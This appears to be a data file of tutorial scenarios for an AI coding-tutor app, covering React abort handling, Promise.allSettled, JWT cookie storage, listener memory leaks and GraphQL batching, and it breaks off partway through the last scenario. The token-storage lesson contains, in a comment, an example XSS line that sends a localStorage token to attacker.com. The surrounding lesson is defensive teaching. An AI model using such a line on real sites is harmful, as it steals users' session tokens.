export const SCENARIOS = [
  {
    id: "getting-started",
    title: "Welcome to Metacognitivity",
    category: "Onboarding",
    difficulty: "Beginner",
    prompt: "How do I use this AI Tutor effectively?",
    
    intentBreakdown: [
      {
        step: 1,
        title: "Ask a Question",
        details: "Use the top search bar to ask any architectural or coding question."
      },
      {
        step: 2,
        title: "Analyze Code",
        details: "The AI will generate an annotated solution for you."
      },
      {
        step: 3,
        title: "Explore Tradeoffs",
        details: "Check the 'Why' annotations and Interactive Simulator to deepen your understanding."
      }
    ],

    tradeoffs: [
      {
        approach: "Passive Reading",
        pros: ["Fast to consume"],
        cons: ["Low retention rate", "Leads to rote memorization without deep comprehension"],
        recommended: false
      },
      {
        approach: "Interactive Metacognition",
        pros: ["Deep understanding", "High retention", "Builds durable mental models of system behavior"],
        cons: ["Takes more time upfront"],
        recommended: true
      }
    ],

    code: `// Welcome to your AI Tutor workspace!
// Ask a question in the search bar above to generate a custom coding scenario.

function welcome() {
  console.log("Ready to master complex software engineering concepts!");
}`,

    whyAnnotations: {
      4: {
        title: "Why start here?",
        badge: "Getting Started",
        type: "pattern",
        summary: "This is a blank canvas.",
        rationale: "Use the input bar at the top to generate real-time AI solutions and interactive scenarios tailored to your exact question."
      }
    },

    simulatorCode: `console.log("Interactive Simulator Ready...");
// When you ask a question, this space will fill with a live-running simulation of the code.`,

    breakpointChallenge: {
      description: "Ready to start? Ask the AI a question to generate a real challenge!",
      buggyCode: `// Waiting for AI generation...`,
      solutionHint: "Try asking: 'How do I implement a React Error Boundary?'"
    },

    diffView: {
      before: `// Before using Metacognitivity`,
      after: `// After using Metacognitivity: Complete Mastery!`
    },

    quiz: [
      {
        question: "What is the primary difference between rote learning and metacognitive learning in software engineering?",
        options: [
          "Rote learning teaches syntax memorization, while metacognitive learning analyzes architectural trade-offs, failure modes, and system interactions",
          "Rote learning is for senior developers, while metacognitive learning is only for beginners",
          "Metacognitive learning requires avoiding all compilers and debuggers",
          "There is no difference; both rely on memorizing boilerplate code snippets"
        ],
        correctIndex: 0,
        explanation: "Metacognitive learning trains developers to evaluate 'why' architectural decisions are made, how failure modes manifest in production, and how to assess trade-offs rather than passively memorizing APIs."
      }
    ]
  },

  {
    id: "react-race-conditions",
    title: "React Hooks: Race Condition Mitigation",
    category: "Frontend Architecture",
    difficulty: "Intermediate",
    prompt: "How do I prevent out-of-order API responses from overwriting newer search results in React?",

    intentBreakdown: [
      {
        step: 1,
        title: "Identify Concurrency Hazard",
        details: "Rapid user keystrokes dispatch concurrent network requests with nondeterministic resolution order."
      },
      {
        step: 2,
        title: "Select Cancellation Mechanism",
        details: "Evaluate browser-native AbortController vs boolean ignore flags."
      },
      {
        step: 3,
        title: "Synchronize Cleanup Lifecycle",
        details: "Link controller.abort() to the useEffect cleanup function to tear down prior fetches before subsequent renders."
      }
    ],

    tradeoffs: [
      {
        approach: "Unmanaged Fetch (Raw useEffect)",
        pros: ["Minimal code"],
        cons: ["Prone to race conditions where older slow responses overwrite newer fast responses"],
        recommended: false
      },
      {
        approach: "Boolean Flag ('ignore = true')",
        pros: ["Prevents state overwrite"],
        cons: ["Does NOT cancel network transmission; wastes user mobile data and server resources"],
        recommended: false
      },
      {
        approach: "AbortController with Signal Cleanup",
        pros: ["Cancels TCP stream at socket layer", "Zero state contamination", "Saves client battery & bandwidth"],
        cons: ["Requires explicit AbortError exception filtering"],
        recommended: true
      }
    ],

    code: `import { useState, useEffect } from 'react';

export function SearchResults({ query }) {
  const [results, setResults] = useState([]);
  const [isSearching, setIsSearching] = useState(false);

  useEffect(() => {
    // Line 9: Allocate an independent AbortController per effect cycle
    const controller = new AbortController();

    async function executeSearch() {
      setIsSearching(true);
      try {
        // Line 16: Associate network request with cancellation signal
        const response = await fetch(\`/api/search?q=\${encodeURIComponent(query)}\`, {
          signal: controller.signal
        });
        const data = await response.json();
        setResults(data.items);
      } catch (err) {
        // Line 23: Ignore expected cancellation errors
        if (err.name !== 'AbortError') {
          console.error('Search request failed:', err);
        }
      } finally {
        setIsSearching(false);
      }
    }

    if (query.trim()) {
      executeSearch();
    }

    // Line 37: Abort in-flight network request before next effect or unmount
    return () => controller.abort();
  }, [query]);

  return <div>{/* Render search results */}</div>;
}`,

    whyAnnotations: {
      9: {
        title: "Why instantiate AbortController inside useEffect?",
        badge: "Lifecycle Isolation",
        type: "architecture",
        summary: "Isolates the cancellation token to the exact render pass that created it.",
        rationale: "Each effect invocation owns its own signal. When query changes, the returned cleanup function aborts this specific request before the next effect runs."
      },
      16: {
        title: "Why pass controller.signal to fetch?",
        badge: "Network Optimization",
        type: "performance",
        summary: "Enables browser-level TCP socket tear-down.",
        rationale: "Passing signal informs the browser networking layer to terminate HTTP request processing immediately if aborted, freeing connection pools."
      },
      23: {
        title: "Why filter out 'AbortError'?",
        badge: "Error Discrimination",
        type: "safety",
        summary: "Distinguishes intentional user aborts from actual network failures.",
        rationale: "controller.abort() deliberately rejects the fetch promise with an AbortError DOMException. Treating this as a failure would show false error toasts to users."
      },
      37: {
        title: "Why return controller.abort in the cleanup function?",
        badge: "Deterministic Teardown",
        type: "safety",
        summary: "Guarantees out-of-order responses never reach state setters.",
        rationale: "React calls this cleanup immediately before running the effect for the new query value or when unmounting, preventing stale responses from arriving late."
      }
    },

    simulatorCode: `// Simulation: Rapid typing trigger
console.log("Simulating 2 rapid searches...");

async function mockSearch(searchTerm, delayMs, signal) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      console.log(\`✅ Finished fetch for: "\${searchTerm}" (\${delayMs}ms)\`);
      resolve({ term: searchTerm, timestamp: Date.now() });
    }, delayMs);

    signal.addEventListener('abort', () => {
      clearTimeout(timer);
      console.log(\`🛑 Aborted in-flight fetch for: "\${searchTerm}"\`);
      reject(new DOMException("Aborted", "AbortError"));
    });
  });
}

const c1 = new AbortController();
mockSearch("reac", 300, c1.signal).catch(e => console.log("Handled:", e.name));

// User types 't' 50ms later -> Abort first search!
setTimeout(() => {
  console.log("User typed 't' -> aborting prior request...");
  c1.abort();
  
  const c2 = new AbortController();
  mockSearch("react", 100, c2.signal).then(res => console.log("Final State Updated with:", res.term));
}, 50);`,

    breakpointChallenge: {
      description: "CHALLENGE: A developer forgot to filter out `err.name !== 'AbortError'`. What bug appears in production?",
      buggyCode: `try {
  const res = await fetch(url, { signal });
} catch (err) {
  // Buggy: alerts the user on every normal keystroke cancellation!
  toast.error("Network request failed: " + err.message);
}`,
      solutionHint: "Wrap the toast notification inside `if (err.name !== 'AbortError') { toast.error(...); }`."
    },

    diffView: {
      before: `// Naive Implementation: Vulnerable to race conditions
useEffect(() => {
  fetch(\`/api/search?q=\${query}\`)
    .then(r => r.json())
    .then(data => setResults(data.items));
}, [query]);`,
      after: `// Metacognitive Implementation: Resilient & Bandwidth-Safe
useEffect(() => {
  const controller = new AbortController();
  fetch(\`/api/search?q=\${query}\`, { signal: controller.signal })
    .then(r => r.json())
    .then(data => setResults(data.items))
    .catch(err => { if (err.name !== 'AbortError') setError(err); });
  return () => controller.abort();
}, [query]);`
    },

    quiz: [
      {
        question: "A developer attempts to fix an autocomplete race condition using a boolean flag `let isCurrent = true; return () => { isCurrent = false; }`. While this prevents stale search results from being rendered, why is this solution still suboptimal compared to an `AbortController`?",
        options: [
          "Boolean flags cannot be declared inside a useEffect closure in React 18",
          "The network request still executes to completion in the background, consuming mobile cellular bandwidth and server compute",
          "Boolean flags trigger an immediate extra React component re-render on cleanup",
          "The JavaScript garbage collector immediately crashes if variables are mutated in closures"
        ],
        correctIndex: 1,
        explanation: "While a boolean flag prevents state pollution, the browser still downloads the entire payload and the server still processes the full database query. An AbortController terminates the TCP connection immediately, saving server CPU and client data."
      },
      {
        question: "If `controller.abort()` is called in the `useEffect` cleanup function, what is the exact mechanism that prevents unhandled promise rejection warnings in the browser console?",
        options: [
          "The fetch API silently turns the rejected promise into undefined",
          "The developer must explicitly catch errors and check `if (err.name !== 'AbortError')` before logging or showing UI error states",
          "React's reconciler automatically suppresses all error throws inside effects",
          "The browser network tab deletes the aborted HTTP request from history"
        ],
        correctIndex: 1,
        explanation: "When aborted, `fetch` rejects with a DOMException named 'AbortError'. If you do not have a `try/catch` or `.catch()` that discriminates this error, it registers as an unhandled rejection."
      }
    ]
  },

  {
    id: "async-concurrency-waterfall",
    title: "Async Concurrency: Waterfalls & Unhandled Rejections",
    category: "JavaScript Engine",
    difficulty: "Intermediate",
    prompt: "Why is Promise.allSettled preferred over Promise.all for independent dashboard widgets?",

    intentBreakdown: [
      {
        step: 1,
        title: "Analyze Dependency Graph",
        details: "Differentiate between dependent operations (sequential pipeline) and independent operations (concurrent batch)."
      },
      {
        step: 2,
        title: "Evaluate Failure Fault-Tolerance",
        details: "Determine whether one widget failure should crash the whole screen (fail-fast) or degrade gracefully (partial fulfillment)."
      },
      {
        step: 3,
        title: "Structure Resilient Consumption",
        details: "Map over settled status descriptors to render partial widgets alongside targeted retry buttons."
      }
    ],

    tradeoffs: [
      {
        approach: "Sequential Awaits (Waterfall)",
        pros: ["Simple linear code"],
        cons: ["Cumulative latency: 200ms + 300ms + 400ms = 900ms total blocking time"],
        recommended: false
      },
      {
        approach: "Promise.all (Fail-Fast)",
        pros: ["Dispatches in parallel; total time is max(200ms, 300ms, 400ms) = 400ms"],
        cons: ["One failure rejects the entire batch, blanking out working widgets"],
        recommended: false
      },
      {
        approach: "Promise.allSettled (Graceful Degradation)",
        pros: ["Concurrent execution", "Never short-circuits", "Allows partial success rendering"],
        cons: ["Requires inspecting status ('fulfilled' vs 'rejected') for each element"],
        recommended: true
      }
    ],

    code: `export async function loadDashboardWidgets(userId) {
  // Line 2: Dispatch independent I/O promises concurrently
  const userPromise = fetch(\`/api/users/\${userId}\`).then(r => r.json());
  const analyticsPromise = fetch(\`/api/analytics/\${userId}\`).then(r => r.json());
  const notificationsPromise = fetch(\`/api/notifications/\${userId}\`).then(r => r.json());

  // Line 7: Wait for all promises to settle without fail-fast abort
  const results = await Promise.allSettled([
    userPromise,
    analyticsPromise,
    notificationsPromise
  ]);

  // Line 14: Normalize output into safe, resilient domain states
  const [userResult, analyticsResult, notificationsResult] = results;

  return {
    user: userResult.status === 'fulfilled' ? userResult.value : null,
    analytics: analyticsResult.status === 'fulfilled' ? analyticsResult.value : null,
    notifications: notificationsResult.status === 'fulfilled' ? notificationsResult.value : [],
    errors: results
      .filter(r => r.status === 'rejected')
      .map(r => r.reason?.message || 'Widget service unavailable')
  };
}`,

    whyAnnotations: {
      2: {
        title: "Why initiate promises before awaiting?",
        badge: "Concurrency Dispatch",
        type: "performance",
        summary: "Starts asynchronous operations immediately on the event loop.",
        rationale: "Calling fetch without immediate await dispatches network requests in parallel. If awaited sequentially, latency equals the sum of all response times instead of the maximum single time."
      },
      7: {
        title: "Why Promise.allSettled over Promise.all?",
        badge: "Fault Isolation",
        type: "safety",
        summary: "Guarantees partial availability in multi-service distributed architectures.",
        rationale: "If the analytics microservice suffers an outage, the user should still see their profile and notifications. Promise.all would reject the whole batch."
      },
      14: {
        title: "Why inspect status descriptor objects?",
        badge: "Deterministic Type Narrowing",
        type: "pattern",
        summary: "Handles both fulfilled values and rejection reasons safely.",
        rationale: "Promise.allSettled produces { status: 'fulfilled', value } or { status: 'rejected', reason }, preventing unhandled exceptions from crashing callers."
      }
    },

    simulatorCode: `// Live Concurrency Latency Benchmark
console.log("⏱️ Comparing Waterfall vs Promise.allSettled...");

const mockTask = (name, ms, shouldFail = false) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (shouldFail) reject(new Error(\`\${name} service down\`));
    else resolve(\`\${name} data ready\`);
  }, ms);
});

// Run Concurrent Test
const start = Date.now();
Promise.allSettled([
  mockTask("User", 150),
  mockTask("Billing", 200, true), // Fails!
  mockTask("Feed", 180)
]).then(results => {
  const duration = Date.now() - start;
  console.log(\`✅ Batch finished concurrently in \${duration}ms (Max single delay ~200ms)\`);
  results.forEach((r, i) => console.log(\`Widget \${i + 1}: \${r.status} \${r.value || r.reason.message}\`));
});`,

    breakpointChallenge: {
      description: "CHALLENGE: Why does `Promise.all([fetch1, fetch2])` cause an unhandled rejection if not wrapped in try/catch?",
      buggyCode: `async function syncData() {
  // If one fails, this throws immediately and aborts remaining operations
  const data = await Promise.all([taskA(), taskB()]);
  return data;
}`,
      solutionHint: "Either catch the error at the Promise.all level, or switch to Promise.allSettled."
    },

    diffView: {
      before: `// Naive Waterfall: 200ms + 300ms = 500ms
const user = await fetchUser();
const feed = await fetchFeed();`,
      after: `// Concurrent Execution: max(200ms, 300ms) = 300ms
const [userRes, feedRes] = await Promise.allSettled([
  fetchUser(),
  fetchFeed()
]);`
    },

    quiz: [
      {
        question: "In a microservice dashboard, 3 independent widgets load data (User Profile, Billing Summary, System Status). If Billing Summary rejects because the billing service is undergoing maintenance, what happens if the developer used `Promise.all` without individual `.catch()` handlers?",
        options: [
          "The other two successful requests are retained and the Billing widget renders a blank card",
          "The entire Promise.all immediately rejects, discarding the results of the healthy services and causing an unhandled error unless caught",
          "The browser automatically retries the failed request 3 times before rejecting",
          "The JavaScript runtime converts the rejected promise into an empty object"
        ],
        correctIndex: 1,
        explanation: "Promise.all employs a fail-fast mechanism: the instant any promise rejects, the outer promise rejects immediately. Working responses from the other promises are ignored."
      },
      {
        question: "Given the JavaScript Event Loop architecture, why does a microtask queued via `Promise.resolve().then(...)` execute before a timer scheduled with `setTimeout(fn, 0)`?",
        options: [
          "Timers run in a separate background thread that takes longer to sync",
          "The event loop flushes the entire microtask queue whenever the call stack clears, before picking the next macrotask from the task queue",
          "setTimeout has a forced hardware minimum delay of 100 milliseconds in all browsers",
          "Promise callbacks bypass the event loop completely and run synchronously"
        ],
        correctIndex: 1,
        explanation: "The JavaScript specification dictates that after every script execution, the microtask queue (Promises, queueMicrotask) is completely drained before the event loop advances to evaluate the next macrotask (setTimeout, setInterval)."
      }
    ]
  },

  {
    id: "web-auth-token-storage",
    title: "Web Security: Token Storage & XSS Defense",
    category: "Full Stack Security",
    difficulty: "Advanced",
    prompt: "Where should sensitive JWT access and refresh tokens be stored to mitigate account takeover attacks?",

    intentBreakdown: [
      {
        step: 1,
        title: "Assess Threat Vectors",
        details: "Analyze the vulnerability profile of Cross-Site Scripting (XSS) vs Cross-Site Request Forgery (CSRF)."
      },
      {
        step: 2,
        title: "Harden Storage Boundaries",
        details: "Configure HttpOnly, Secure, and SameSite cookie attributes to prevent JavaScript execution contexts from reading session secrets."
      },
      {
        step: 3,
        title: "Implement Token Rotation",
        details: "Use short-lived in-memory access tokens with HttpOnly refresh tokens to limit the replay exposure window."
      }
    ],

    tradeoffs: [
      {
        approach: "LocalStorage / SessionStorage",
        pros: ["Trivially easy to read in frontend code"],
        cons: ["Vulnerable to XSS: any compromised dependency or script tag can read and exfiltrate all tokens"],
        recommended: false
      },
      {
        approach: "Plain Cookies (No HttpOnly)",
        pros: ["Sent automatically on requests"],
        cons: ["Still readable via document.cookie by malicious scripts"],
        recommended: false
      },
      {
        approach: "HttpOnly, Secure, SameSite=Strict Cookies",
        pros: ["Zero JavaScript access (XSS immune)", "Browser-enforced transmission constraints", "SameSite blocks CSRF"],
        cons: ["Requires CORS credentials configuration and backend alignment"],
        recommended: true
      }
    ],

    code: `// Secure Express Authentication Middleware
export function issueAuthCookies(res, userSession) {
  // Line 3: Generate high-entropy refresh token
  const refreshToken = generateSecureToken(userSession.id);

  // Line 6: Store refresh token in HttpOnly cookie
  res.cookie('__Secure-refresh_token', refreshToken, {
    httpOnly: true,              // Line 8: Prohibits JavaScript document.cookie access
    secure: true,                // Line 9: Mandates HTTPS transport only
    sameSite: 'strict',          // Line 10: Prevents cross-site request forgery (CSRF)
    path: '/api/auth/refresh',   // Line 11: Scopes transmission strictly to refresh endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days expiration
  });

  // Line 15: Return short-lived access token in response body (held in memory only)
  const accessToken = createShortLivedJwt(userSession, '15m');
  return res.status(200).json({
    success: true,
    accessToken,
    expiresIn: 900
  });
}`,

    whyAnnotations: {
      8: {
        title: "Why httpOnly: true?",
        badge: "XSS Barrier",
        type: "safety",
        summary: "Blocks client-side JavaScript access.",
        rationale: "Even if an attacker finds an XSS vulnerability on your site, document.cookie returns empty for HttpOnly cookies. The script cannot steal or exfiltrate the token."
      },
      9: {
        title: "Why secure: true?",
        badge: "TLS Enforcement",
        type: "security",
        summary: "Restricts cookie transmission strictly to encrypted HTTPS connections.",
        rationale: "Prevents man-in-the-middle packet sniffers on public Wi-Fi networks from intercepting plain-text session headers."
      },
      10: {
        title: "Why sameSite: 'strict'?",
        badge: "CSRF Neutralization",
        type: "security",
        summary: "Stops browsers from appending the cookie on third-party cross-site requests.",
        rationale: "If a malicious site triggers a form submission or link to your domain, the browser refrains from sending the cookie, neutralizing CSRF attacks."
      },
      11: {
        title: "Why scope path: '/api/auth/refresh'?",
        badge: "Least Privilege Pathing",
        type: "architecture",
        summary: "Restricts transmission to only the rotation endpoint.",
        rationale: "The browser will not include the refresh token header when requesting regular API endpoints like /api/posts, minimizing token exposure."
      }
    },

    simulatorCode: `// Live Security Sandboxing Demonstration
console.log("🔒 Demonstrating Cookie Sandbox Isolation...");

const mockCookieJar = {
  'session_id': { value: 'secret-xyz-987', httpOnly: true, secure: true, sameSite: 'strict' },
  'theme': { value: 'dark', httpOnly: false }
};

// Simulated JavaScript Execution Context (Attacker XSS payload)
function attackerScript() {
  console.log("🏴‍☠️ Attacker script running: document.cookie read attempt...");
  const visibleCookies = Object.entries(mockCookieJar)
    .filter(([_, conf]) => !conf.httpOnly)
    .map(([k, conf]) => \`\${k}=\${conf.value}\`)
    .join('; ');
  
  console.log("Visible to JavaScript:", visibleCookies || "[EMPTY]");
  if (!visibleCookies.includes('session_id')) {
    console.log("🛡️ SUCCESS: HttpOnly flag successfully concealed session_id from JS execution!");
  }
}

attackerScript();`,

    breakpointChallenge: {
      description: "CHALLENGE: Spot the security vulnerability in storing JWT tokens in localStorage.",
      buggyCode: `// Login Handler
const { token } = await res.json();
localStorage.setItem('auth_token', token); // Critical risk!`,
      solutionHint: "Any third-party script loaded on the page or XSS vulnerability can read `localStorage.getItem('auth_token')` and send it to an attacker server."
    },

    diffView: {
      before: `// Vulnerable: Stored in localStorage
localStorage.setItem('jwt', token);
// Any XSS payload can run:
// fetch('https://attacker.com/steal?t=' + localStorage.getItem('jwt'))`,
      after: `// OWASP Recommended: HttpOnly Cookie
res.cookie('jwt', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});`
    },

    quiz: [
      {
        question: "According to OWASP security guidelines, why is storing authentication tokens in `localStorage` considered a severe architectural vulnerability?",
        options: [
          "LocalStorage is cleared every time the browser tab is refreshed",
          "LocalStorage has no access-control boundary against JavaScript; any XSS flaw or malicious NPM dependency can read and exfiltrate the token via `localStorage.getItem()`",
          "LocalStorage can only store up to 50 bytes of ASCII characters",
          "LocalStorage data is automatically broadcast to other computers on the local network"
        ],
        correctIndex: 1,
        explanation: "Unlike cookies configured with the HttpOnly attribute, localStorage is completely open to the page's execution context. If an attacker injects even one line of script through an XSS vulnerability, they can steal all tokens stored in localStorage."
      },
      {
        question: "If an authentication token is stored in an `HttpOnly` cookie, which security flag must be combined with it to prevent Cross-Site Request Forgery (CSRF) without requiring custom anti-CSRF token synchronization?",
        options: [
          "SameSite=Strict or SameSite=Lax",
          "Cache-Control: no-cache",
          "Access-Control-Allow-Origin: *",
          "Content-Security-Policy: default-src 'none'"
        ],
        correctIndex: 0,
        explanation: "While HttpOnly prevents script access, browsers automatically send cookies on cross-origin requests. Setting SameSite=Strict (or Lax for top-level navigations) prevents the browser from attaching the cookie when requests originate from third-party websites, defusing CSRF."
      }
    ]
  },

  {
    id: "detached-dom-memory-leak",
    title: "DOM Memory Hygiene: Detached Nodes & Closures",
    category: "Performance",
    difficulty: "Advanced",
    prompt: "Why do uncleaned event listeners retain detached DOM trees in memory?",

    intentBreakdown: [
      {
        step: 1,
        title: "Trace Retaining Paths",
        details: "Inspect how the Garbage Collector GC Root traces through the window listener registry and closures back to unmounted elements."
      },
      {
        step: 2,
        title: "Identify Anonymous Handler Traps",
        details: "Recognize that removeEventListener requires an identical function reference, making inline arrow functions impossible to unregister."
      },
      {
        step: 3,
        title: "Implement Signal-Based Teardown",
        details: "Use AbortController.signal to unbind arbitrary groups of event listeners simultaneously on component unmount."
      }
    ],

    tradeoffs: [
      {
        approach: "Unregistered Anonymous Listener",
        pros: ["Quick inline coding"],
        cons: ["Permanent memory leak: keeps detached DOM nodes and their parent scopes alive in V8 heap"],
        recommended: false
      },
      {
        approach: "Manual removeEventListener",
        pros: ["Standard browser API"],
        cons: ["Requires preserving named function references; error-prone with multiple listeners"],
        recommended: false
      },
      {
        approach: "EventListener with AbortSignal",
        pros: ["One controller.abort() call cleans up dozens of listeners instantly", "Clean teardown in useEffect"],
        cons: ["Supported in modern browsers (Chrome 90+, Node 16+)"],
        recommended: true
      }
    ],

    code: `import { useEffect, useRef } from 'react';

export function HeavyDataGridModal({ isOpen, onClose }) {
  const modalRef = useRef(null);

  useEffect(() => {
    if (!isOpen) return;

    // Line 9: Allocate an AbortController specifically for listener lifecycle
    const controller = new AbortController();
    const { signal } = controller;

    // Line 13: Pass signal option to all event listeners
    window.addEventListener('resize', () => {
      recalculateGridPositions(modalRef.current);
    }, { signal });

    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') onClose();
    }, { signal });

    // Line 22: Automatically disconnects ALL listeners on unmount
    return () => {
      controller.abort();
    };
  }, [isOpen, onClose]);

  if (!isOpen) return null;
  return <div ref={modalRef} className="modal-container">{/* Heavy data grid */}</div>;
}`,

    whyAnnotations: {
      9: {
        title: "Why use AbortController for event listeners?",
        badge: "Modern DOM Hygiene",
        type: "performance",
        summary: "Provides atomic multi-listener deregistration.",
        rationale: "Instead of declaring and storing 5 separate named function references to call removeEventListener 5 times, passing { signal } lets you sever all listeners in a single controller.abort() call."
      },
      13: {
        title: "How does the closure create a memory leak without cleanup?",
        badge: "V8 Heap Retention",
        type: "memory",
        summary: "The window listener anchors the closure, which anchors modalRef.current, retaining the detached DOM tree.",
        rationale: "Because window is a root object that never gets garbage collected, any listener attached to window stays alive forever. If that listener references DOM nodes, those DOM nodes can never be collected, even after being removed from document.body."
      },
      22: {
        title: "Why is controller.abort() sufficient?",
        badge: "GC Severance",
        type: "safety",
        summary: "De-registers the listener from the browser's internal dispatch table.",
        rationale: "Once aborted, the browser drops its pointer to the listener function, breaking the reference chain from the GC Root and allowing V8 to reclaim memory."
      }
    },

    simulatorCode: `// Memory Retention Simulator
console.log("🔬 Simulating Event Listener Lifecycle...");

class MockElement {
  constructor(name) { this.name = name; }
}

let activeListeners = [];

function addListener(event, handler, options = {}) {
  const entry = { event, handler, signal: options.signal };
  activeListeners.push(entry);

  if (options.signal) {
    options.signal.addEventListener('abort', () => {
      activeListeners = activeListeners.filter(l => l !== entry);
      console.log(\`🧹 Cleaned up listener for: "\${event}" via AbortSignal\`);
    });
  }
}

const controller = new AbortController();
addListener('resize', () => {}, { signal: controller.signal });
addListener('keydown', () => {}, { signal: controller.signal });

console.log("Active listeners before unmount:", activeListeners.length);
controller.abort();
console.log("Active listeners after unmount:", activeListeners.length);`,

    breakpointChallenge: {
      description: "CHALLENGE: Why does `window.removeEventListener('resize', () => handle())` fail to clean up the listener?",
      buggyCode: `useEffect(() => {
  window.addEventListener('resize', () => handle());
  // Buggy: Passes a NEW anonymous function reference, so removal is a no-op!
  return () => window.removeEventListener('resize', () => handle());
}, []);`,
      solutionHint: "The arrow function in the cleanup creates a brand-new function object in memory. removeEventListener compares by reference equality (===) and fails to match."
    },

    diffView: {
      before: `// Leaking Implementation: Anonymous reference mismatch
useEffect(() => {
  window.addEventListener('resize', () => update());
  return () => window.removeEventListener('resize', () => update()); // NO-OP!
}, []);`,
      after: `// Clean Implementation: Signal-based atomic deregistration
useEffect(() => {
  const controller = new AbortController();
  window.addEventListener('resize', update, { signal: controller.signal });
  return () => controller.abort();
}, []);`
    },

    quiz: [
      {
        question: "In Chrome DevTools Memory Profiler, a Heap Snapshot reveals several megabytes retained under 'Detached HTMLCanvasElement'. What specifically prevents the browser's V8 Garbage Collector from reclaiming these removed DOM elements?",
        options: [
          "The browser's garbage collector only executes when the user closes the entire browser window",
          "An active event listener registered on a global object (like `window`) closed over the element or its parent scope, maintaining a reference path from a GC Root",
          "HTML5 canvas elements are compiled to WebAssembly binary blocks that cannot be deleted",
          "The element had its CSS `visibility` set to `hidden`"
        ],
        correctIndex: 1,
        explanation: "Garbage collection in JavaScript is based on reachability from GC Roots (such as `window` or the global call stack). When an element is detached from the document tree, it remains alive in memory if a global event listener holds a closure referencing that element."
      },
      {
        question: "Why does calling `window.removeEventListener('resize', () => handleResize())` fail to remove a listener previously added with `window.addEventListener('resize', () => handleResize())`?",
        options: [
          "The removeEventListener API only accepts string identifiers, not functions",
          "Each arrow function instantiation produces a unique object reference in memory; `removeEventListener` performs a strict reference equality check (`===`) and finds no match",
          "The `resize` event does not support the removeEventListener API",
          "Arrow functions are automatically hoisted to the global prototype"
        ],
        correctIndex: 1,
        explanation: "In JavaScript, functions are objects compared by reference identity. Writing `() => handleResize()` in the cleanup creates an entirely new function object in memory that does not match the reference registered earlier."
      }
    ]
  },

  {
    id: "graphql-n-plus-one",
    title: "System Design: Solving the GraphQL N+1 Problem",
    category: "System Design",
    difficulty: "Advanced",
    prompt: "How do we prevent resolver-per-field database query explosions using the DataLoader pattern?",

    intentBreakdown: [
      {
        step: 1,
        title: "Diagnose Resolver Fan-Out",
        details: "Understand how GraphQL's decoupled field resolvers execute independent database queries per parent list item."
      },
      {
        step: 2,
        title: "Introduce Microtask Batching",
        details: "Use DataLoader to queue keys within a single tick of the event loop and fire a consolidated batch query."
      },
      {
        step: 3,
        title: "Enforce Key Order & Request Caching",
        details: "Ensure the batch loader returns results matching the exact order and length of input keys, scoped per-request to avoid cache pollution."
      }
    ],

    tradeoffs: [
      {
        approach: "Naive Resolver Queries",
        pros: ["Trivial to write in individual resolvers"],
        cons: ["The N+1 problem: 50 items = 1 list query + 50 individual queries = 51 round-trips to DB"],
        recommended: false
      },
      {
        approach: "Complex SQL Joins in REST",
        pros: ["Single database query"],
        cons: ["Rigid coupling; leads to over-fetching when clients don't request the joined fields"],
        recommended: false
      },
      {
        approach: "DataLoader Batching & In-Memory Caching",
        pros: ["Reduces 51 round-trips to 2", "Automatic request-level deduplication", "Retains modular schema design"],
        cons: ["Batch function must strictly preserve key ordering and handle individual errors"],
        recommended: true
      }
    ],

    code: `import DataLoader from 'dataloader';

// Line 3: Define batch function: receives array of keys, returns array of values
export function createAuthorLoader(db) {
  return new DataLoader(async (authorIds) => {
    // Line 6: Consolidate N queries into 1 batch SQL query
    const authors = await db.query(
      'SELECT id, name, avatar FROM authors WHERE id = ANY($1)',
      [authorIds]
    );

    // Line 12: CRITICAL: Results must map 1-to-1 to input key order
    const authorMap = new Map(authors.map(a => [a.id, a]));
    return authorIds.map(id => authorMap.get(id) || null);
  });
}

// Line 18: GraphQL Resolver implementation
export const resolvers = {
  Post: {
    author: (post, _, context) => {
      // Line 22: Queues ID across event-loop tick; DataLoader batches them
      return context.loaders.authorLoader.load(post.authorId);
    }
  }
};`,

    whyAnnotations: {
      3: {
        title: "Why instantiate DataLoader per HTTP request?",
        badge: "Multi-Tenant Isolation",
        type: "safety",
        summary: "Prevents cross-user data leakage and stale caching.",
        rationale: "DataLoader maintains an in-memory memoization cache. If shared globally across requests, User A could see cached data belonging to User B, violating security boundaries."
      },
      6: {
        title: "How does DataLoader batch multiple resolver calls?",
        badge: "Event Loop Microtask Tick",
        type: "performance",
        summary: "Buffers calls within the current execution frame.",
        rationale: "When 50 Post.author resolvers call loader.load(id), DataLoader schedules the batch function as a microtask. All 50 IDs are collected and passed to the batch function in a single query."
      },
      12: {
        title: "Why must the returned array match the exact order and length of keys?",
        badge: "Contract Invariant",
        type: "architecture",
        summary: "DataLoader matches input promises to output indices positionally.",
        rationale: "If you pass [1, 2, 3] and the database returns rows in order [3, 1, 2], DataLoader would resolve Promise 1 with Author 3 without explicit index mapping."
      }
    },

    simulatorCode: `// DataLoader Simulation
console.log("⚡ Simulating N+1 vs DataLoader Batching...");

class MockDataLoader {
  constructor(batchFn) {
    this.batchFn = batchFn;
    this.queue = [];
  }

  load(key) {
    return new Promise((resolve) => {
      this.queue.push({ key, resolve });
      if (this.queue.length === 1) {
        queueMicrotask(() => this.flush());
      }
    });
  }

  async flush() {
    const currentQueue = this.queue;
    this.queue = [];
    const keys = currentQueue.map(item => item.key);
    console.log(\`📦 Dispatched SINGLE batch query for \${keys.length} keys: [\${keys.join(', ')}]\`);
    const results = await this.batchFn(keys);
    currentQueue.forEach((item, i) => item.resolve(results[i]));
  }
}

const loader = new MockDataLoader(async (ids) => ids.map(id => ({ id, name: \`Author \${id}\` })));

// 3 separate resolvers call load in same tick
loader.load(101).then(a => console.log("Resolver 1 received:", a.name));
loader.load(102).then(a => console.log("Resolver 2 received:", a.name));
loader.load(103).then(a => console.log("Resolver 3 received:", a.name));`,

    breakpointChallenge: {
      description: "CHALLENGE: What critical bug occurs if the DataLoader batch function returns fewer items than the input keys?",
      buggyCode: `// Buggy batch function
const loader = new DataLoader(async (ids) => {
  const users = await db.find({ id: { $in: ids } });
  return users; // Fails if some users were not found in DB!
});`,
      solutionHint: "The returned array must have the exact same length as `ids`. If a user doesn't exist, return `null` or an `Error` object at that index."
    },

    diffView: {
      before: `// Naive GraphQL Resolver: N+1 queries
Post: {
  author: async (post) => {
    // 50 posts = 50 queries!
    return await db.query('SELECT * FROM authors WHERE id = $1', [post.authorId]);
  }
}`,
